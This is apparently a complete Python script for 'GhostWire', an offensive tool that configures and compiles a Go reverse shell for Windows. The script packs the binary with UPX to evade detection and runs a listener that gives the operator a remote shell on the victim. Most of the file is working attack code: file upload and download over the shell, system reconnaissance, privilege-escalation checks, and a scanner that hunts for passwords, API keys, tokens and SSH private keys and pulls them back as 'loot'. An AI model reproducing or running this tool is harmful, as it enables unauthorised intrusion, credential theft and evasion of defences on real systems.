import argparse
import re
import sys
import subprocess
import os
import signal
import socket
import time
import base64

BANNER = (""""
 .---. .-. .-. .----.  .----..---. .-. . .-..-..----. .----.
/   __}| {_} |/  {}  \{ {__ {_   _}| |/ \| || || {}  }| {_  
\  {_ }| { } |\      /.-._} } | |  |  .'.  || || .-. \| {__ 
 `---' `-' `-' `----' `----'  `-'  `-'   `-'`-'`-' `-'`----'
 V1.0 By D3D5kull
 
 Tiktok: d3d5kull

""")

art = ("""
        .·¨¨'.
    .·´.·´`·.`·.
   :  ;      ':  :
    \ `·. ¸·´ '/
 .·´``·. ` ..·´¨`·.
:       `.;         :
:   :           :   :
:   :           :   :
`. .´:        :`. .´
((((/         \:'))))||::::::›
   :           :
   `·.       .´
     :       /                   IM IN YOUR WALLS
    /      :´
   ':   .·´
    `·(

""")

# --- C2 Communication Functions ---

def execute_command(client_socket, command):
    """Sends a command and retrieves the full response."""
    if not command.strip():
        return ""
    try:
        client_socket.sendall(command.encode() + b'\n')
        # Wait for command output
        client_socket.settimeout(3.0)
        response = b""
        while True:
            try:
                chunk = client_socket.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        return response.decode(errors='ignore')
    except socket.error as e:
        return f"[!] Socket error during command execution: {e}"

def download_file(client_socket, remote_path, local_path):
    """Downloads a file from the target using PowerShell to base64 encode it."""
    print(f"[*] Downloading '{remote_path}' to '{local_path}'...")
    # PowerShell command to read a file and output it as a single base64 string
    ps_command = f"powershell -c \"try {{ $content = Get-Content -Path '{remote_path}' -Raw; [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content)) }} catch {{ Write-Host 'Error: File not found or access denied.' }}\""
    
    base64_content = execute_command(client_socket, ps_command)

    if not base64_content.strip() or "Error:" in base64_content:
        print(f"[!] Failed to download file. Error: {base64_content}")
        return

    try:
        decoded_data = base64.b64decode(base64_content)
        with open(local_path, 'wb') as f:
            f.write(decoded_data)
        print(f"[+] File successfully downloaded to '{local_path}' ({len(decoded_data)} bytes).")
    except Exception as e:
        print(f"[!] Failed to decode or save file. Error: {e}")

def upload_file(client_socket, local_path, remote_path):
    """Uploads a file to the target by chunking it and reassembling with PowerShell."""
    if not os.path.exists(local_path):
        print(f"[!] Error: Local file '{local_path}' not found.")
        return

    print(f"[*] Uploading '{local_path}' to '{remote_path}'...")
    
    try:
        with open(local_path, 'rb') as f:
            file_content = f.read()
        
        base64_content = base64.b64encode(file_content).decode()
        
        # Using a temporary file on the target for reassembly
        remote_temp_b64_path = f"C:\\Users\\Public\\{os.path.basename(local_path)}.b64"

        # Upload in chunks to avoid command line length limits
        chunk_size = 2048
        for i in range(0, len(base64_content), chunk_size):
            chunk = base64_content[i:i+chunk_size]
            print(f"\r[*] Uploading chunk {i//chunk_size + 1}/{(len(base64_content) + chunk_size - 1)//chunk_size}...", end="")
            
            # Use WriteAllText for the first chunk (overwrite) and AppendAllText for the rest
            method = "WriteAllText" if i == 0 else "AppendAllText"
            ps_command = f"powershell -c \"[System.IO.File]::{method}('{remote_temp_b64_path}', '{chunk}')\""
            execute_command(client_socket, ps_command)
        
        print("\n[*] Reassembling file on target...")
        # Decode the base64 file and write to the final destination, then clean up
        ps_decode_command = f"powershell -c \"$b64 = Get-Content -Path '{remote_temp_b64_path}'; $bytes = [System.Convert]::FromBase64String($b64); [System.IO.File]::WriteAllBytes('{remote_path}', $bytes); Remove-Item -Path '{remote_temp_b64_path}'\""
        result = execute_command(client_socket, ps_decode_command)

        if "error" in result.lower():
            print(f"[!] Error during reassembly on target: {result}")
        else:
            print(f"[+] File successfully uploaded to '{remote_path}'.")

    except Exception as e:
        print(f"[!] An error occurred during upload: {e}")

def run_infogather_module(client_socket, client_address, local_loot_path):
    """Runs a sequence of info-gathering commands and downloads the result."""
    print("[*] Starting automated info gathering module...")
    
    # Define a stable path on the target for the output bundle
    target_bundle_file = "C:\\Users\\Public\\gw_bundle.txt"
    
    # List of commands to execute on the target
    commands_to_run = [
        "(echo [--- SYSTEMINFO ---] & systeminfo)",
        "(echo. & echo [--- IPCONFIG ---] & ipconfig /all)",
        "(echo. & echo [--- TASKLIST ---] & tasklist)",
        "(echo. & echo [--- NET USER ---] & net user)",
        "(echo. & echo [--- NETSTAT ---] & netstat -ano)",
        "(echo. & echo [--- ARP TABLE ---] & arp -a)",
        "(echo. & echo [--- RECENT FILES ---] & dir C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\)",
        "(echo. & echo [--- DOWNLOADS ---] & dir C:\\Users\\*\\Downloads\\ /s /b)",
    ]

    # Execute the commands, redirecting output to the bundle file
    print("[*] Executing commands on target (this may take a moment)...")
    
    # Overwrite with the first command's output
    execute_command(client_socket, f"{commands_to_run[0]} > {target_bundle_file}")
    
    # Append with the rest of the commands' output
    for i, gather_cmd in enumerate(commands_to_run[1:]):
        print(f"\r[*] Running step {i+2}/{len(commands_to_run)}...", end="")
        execute_command(client_socket, f"{gather_cmd} >> {target_bundle_file}")
        time.sleep(0.2) # Small delay for stability

    print("\n[+] Target information gathering complete.")
    
    # Download the results bundle
    download_file(client_socket, target_bundle_file, local_loot_path)
    
    # Clean up the bundle file on the target
    print("[*] Cleaning up on target...")
    execute_command(client_socket, f"del {target_bundle_file}")
    print("[+] Module finished.")

def run_privesc_checker_module(client_socket, client_address, local_loot_path):
    """Runs a sequence of privilege escalation checks and downloads the result."""
    print("[*] Starting privilege escalation check module...")
    
    target_bundle_file = "C:\\Users\\Public\\privesc_bundle.txt"
    
    # Commands to check for common privesc vectors
    commands_to_run = [
        "(echo [--- UNQUOTED SERVICE PATHS ---] & wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\\\"\" )",
        "(echo. & echo [--- ALWAYSINSTALLELEVATED CHECK ---] & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated)",
        "(echo. & echo [--- UNATTENDED INSTALL FILES ---] & dir /s /b C:\\unattend.xml C:\\Windows\\Panther\\unattend.xml C:\\sysprep.inf C:\\sysprep\\sysprep.xml)",
        "(echo. & echo [--- CURRENT USER PRIVILEGES ---] & whoami /priv)"
    ]

    print("[*] Executing checks on target...")
    
    # Run and capture output
    execute_command(client_socket, f"{commands_to_run[0]} > {target_bundle_file}")
    for i, check_cmd in enumerate(commands_to_run[1:]):
        print(f"\r[*] Running check {i+2}/{len(commands_to_run)}...", end="")
        execute_command(client_socket, f"{check_cmd} >> {target_bundle_file}")
        time.sleep(0.2)

    print("\n[+] Target scan complete.")
    
    # Download and clean up
    download_file(client_socket, target_bundle_file, local_loot_path)
    print("[*] Cleaning up on target...")
    execute_command(client_socket, f"del {target_bundle_file}")
    print("[+] Module finished.")

def run_cred_scanner_module(client_socket, client_address, local_loot_path):
    """Runs a plaintext credential scanner and downloads the result."""
    print("[*] Starting plaintext credential scanner module...")
    
    target_bundle_file = "C:\\Users\\Public\\cred_bundle.txt"
    
    # Commands to find sensitive files and content. /P skips non-printable files.
    commands_to_run = [
        ("(echo [--- Looking for files named 'credentials', 'password', '.env' ---] & dir /s /b C:\\Users\\*credential* C:\\Users\\*password* C:\\Users\\*.env)"),
        ("(echo. & echo [--- Looking for SSH private keys ---] & dir /s /b C:\\Users\\*id_rsa* C:\\Users\\*id_dsa* C:\\Users\\*id_ed25519*)"),
        ("(echo. & echo [--- Searching for 'password' in common config files ---] & findstr /s /i /p \"password\" C:\\Users\\*.ini C:\\Users\\*.config C:\\Users\\*.xml C:\\Users\\*.yml)"),
        ("(echo. & echo [--- Searching for 'api_key' in common script/text files ---] & findstr /s /i /p \"api_key\" C:\\Users\\*.txt C:\\Users\\*.json C:\\Users\\*.py C:\\Users\\*.js C:\\Users\\*.sh)"),
        ("(echo. & echo [--- Searching for 'token' ---] & findstr /s /i /p \"token\" C:\\Users\\*.txt C:\\Users\\*.json)"),
        ("(echo. & echo [--- Searching for 'BEGIN PRIVATE KEY' ---] & findstr /s /i /p \"BEGIN PRIVATE KEY\" C:\\Users\\*.pem C:\\Users\\*.key)"),
    ]

    print("[*] Executing scanner on target (this could take several minutes)...")
    
    # Run and capture output
    execute_command(client_socket, f"{commands_to_run[0]} > {target_bundle_file}")
    for i, scan_cmd in enumerate(commands_to_run[1:]):
        print(f"\r[*] Running scan {i+2}/{len(commands_to_run)}...", end="")
        execute_command(client_socket, f"{scan_cmd} >> {target_bundle_file}")
        time.sleep(0.5) # Give shell time to breathe between long-running commands

    print("\n[+] Target scan complete.")
    
    # Download and clean up
    download_file(client_socket, target_bundle_file, local_loot_path)
    print("[*] Cleaning up on target...")
    execute_command(client_socket, f"del {target_bundle_file}")
    print("[+] Module finished.")


def shell_session(client_socket, client_address):
    """Handles the interactive shell session with the connected target."""
    print(f"\n[+] Connection from {client_address[0]}:{client_address[1]}")
    print("[*] Shell session started. Type 'help' for custom commands.")

    while True:
        try:
            command = input(f"GhostWire ({client_address[0]}) > ")
            if command.lower() in ["exit", "quit"]:
                client_socket.close()
                print("[*] Session closed.")
                break
            
            if command.strip() == "":
                continue

            parts = command.split()
            cmd = parts[0].lower()

            if cmd == "help":
                print("\n--- GhostWire Custom Commands ---")
                print("upload <local_path> <remote_path>  - Upload a file to the target.")
                print("download <remote_path> <local_path> - Download a file from the target.")
                print("infogather [local_save_path]       - Run automated info gathering module.")
                print("privesc_check [local_save_path]    - Run automated privilege escalation checker.")
                print("cred_scanner [local_save_path]     - Scan for plaintext credentials and keys.")
                print("exit / quit                          - Close the current session.")
                print("-----------------------------------")
                print("Any other command will be executed directly on the target shell.\n")
            elif cmd == "download":
                if len(parts) == 3:
                    download_file(client_socket, parts[1], parts[2])
                else:
                    print("[!] Usage: download <remote_path> <local_path>")
            elif cmd == "upload":
                if len(parts) == 3:
                    upload_file(client_socket, parts[1], parts[2])
                else:
                    print("[!] Usage: upload <local_path> <remote_path>")
            elif cmd == "infogather":
                if len(parts) > 2:
                    print("[!] Usage: infogather [local_save_path]")
                    continue
                # Use provided path or create a default one
                local_loot_path = parts[1] if len(parts) == 2 else f"loot_{client_address[0]}_{int(time.time())}.txt"
                run_infogather_module(client_socket, client_address, local_loot_path)
            elif cmd == "privesc_check":
                if len(parts) > 2:
                    print("[!] Usage: privesc_check [local_save_path]")
                    continue
                local_loot_path = parts[1] if len(parts) == 2 else f"privesc_{client_address[0]}_{int(time.time())}.txt"
                run_privesc_checker_module(client_socket, client_address, local_loot_path)
            elif cmd == "cred_scanner":
                if len(parts) > 2:
                    print("[!] Usage: cred_scanner [local_save_path]")
                    continue
                local_loot_path = parts[1] if len(parts) == 2 else f"creds_{client_address[0]}_{int(time.time())}.txt"
                run_cred_scanner_module(client_socket, client_address, local_loot_path)
            else:
                # Execute as a standard shell command
                response = execute_command(client_socket, command)
                print(response, end='')

        except KeyboardInterrupt:
            print("\n[*] To exit the shell, type 'exit' or 'quit'.")
        except Exception as e:
            print(f"\n[!] Session error: {e}")
            break

def start_handler(lport):
    """Starts the listener to wait for an incoming connection."""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server_socket.bind(('', int(lport)))
        server_socket.listen(1)
        print(f"[*] Starting listener on port {lport}...")
        print("[*] Waiting for connection... Press Ctrl+C to stop.")
        
        client_socket, client_address = server_socket.accept()
        shell_session(client_socket, client_address)

    except KeyboardInterrupt:
        print("\n[*] Ctrl+C detected. Shutting down listener...")
    except Exception as e:
        print(f"\n[!] An error occurred: {e}")
    finally:
        if 'server_socket' in locals() and server_socket.fileno() != -1:
            server_socket.close()
        print("[*] Listener stopped.")

def main():
    """
    This script configures, compiles, and sets up a listener for the Go reverse shell.
    """
    parser = argparse.ArgumentParser(description="Build the Go reverse shell and start a listener.")
    parser.add_argument("--ip", required=True, help="The listener IP address to embed in the shell.")
    parser.add_argument("--port", required=True, help="The public listener port to embed in the shell.")
    parser.add_argument("--lport", help="The local port to listen on. Defaults to the public port if not set.")
    args = parser.parse_args()

    ip = args.ip
    port = args.port
    lport = args.lport if args.lport else port # Default lport to port
    go_file = 'reverse_shell.go'
    output_file = 'reverse.exe'

    # --- 1. Configure Go Source ---
    try:
        with open(go_file, 'r') as f:
            content = f.read()
    except FileNotFoundError:
        print(f"[!] Error: The source file '{go_file}' was not found.")
        sys.exit(1)

    content, count_ip = re.subn(r'(const ATTACKER_IP = ")(.*)(")', f'\\g<1>{ip}\\g<3>', content)
    content, count_port = re.subn(r'(const ATTACKER_PORT = ")(.*)(")', f'\\g<1>{port}\\g<3>', content)

    if count_ip == 0 or count_port == 0:
        print(f"[!] Warning: Could not find placeholders in '{go_file}'.")
    
    with open(go_file, 'w') as f:
        f.write(content)

    print(f"[+] Successfully configured '{go_file}' with IP {ip} and Port {port}.")

    # --- 2. Attempt Automated Compilation ---
    print(f"[*] Attempting to cross-compile for Windows -> '{output_file}'...")
    # Add -s and -w flags to strip debug info and symbols, making it smaller and harder to analyze
    build_command = f"GOOS=windows GOARCH=amd64 go build -ldflags \"-s -w -H=windowsgui\" -o {output_file} {go_file}"

    try:
        subprocess.run(
            build_command,
            shell=True,
            capture_output=True,
            text=True,
            check=True  # Raise an exception for non-zero exit codes
        )
        print(f"[+] Successfully compiled '{output_file}'.")

        # --- Pack the executable with UPX to obfuscate it ---
        print("[*] Packing the executable with UPX to reduce detection...")
        pack_command = f"upx --best --force {output_file}"
        try:
            pack_result = subprocess.run(
                pack_command,
                shell=True,
                capture_output=True,
                text=True,
                check=True
            )
            print("[+] Executable successfully packed.")
            # Optional: print UPX output if needed, e.g., pack_result.stdout
        except FileNotFoundError:
            print("[!] Warning: 'upx' command not found. The executable was not packed.")
        except subprocess.CalledProcessError as e:
            print(f"[!] Warning: UPX packing failed. Stderr: {e.stderr.strip()}")

    except subprocess.CalledProcessError as e:
        print("\n" + "="*50)
        print("[!] AUTOMATED COMPILATION FAILED!")
        print("[!] This is likely due to an environment issue with the Go compiler.")
        print(f"[!] Stderr: {e.stderr.strip()}")
        print("\n[*] You must run the following command manually to compile:")
        print(f"\n    {build_command}\n")
        print("="*50 + "\n")
        sys.exit(1)
    except FileNotFoundError:
        print("\n[!] Command 'go' not found. Is Go installed and in your PATH?")
        sys.exit(1)

    # --- 3. Start Listener ---
    print(BANNER)
    print(art)
    print(f"[*] Ready for connection. Transfer '{output_file}' to the target and execute it.")
    
    start_handler(lport)

    print("[*] Script finished.")

if __name__ == "__main__":
    main()
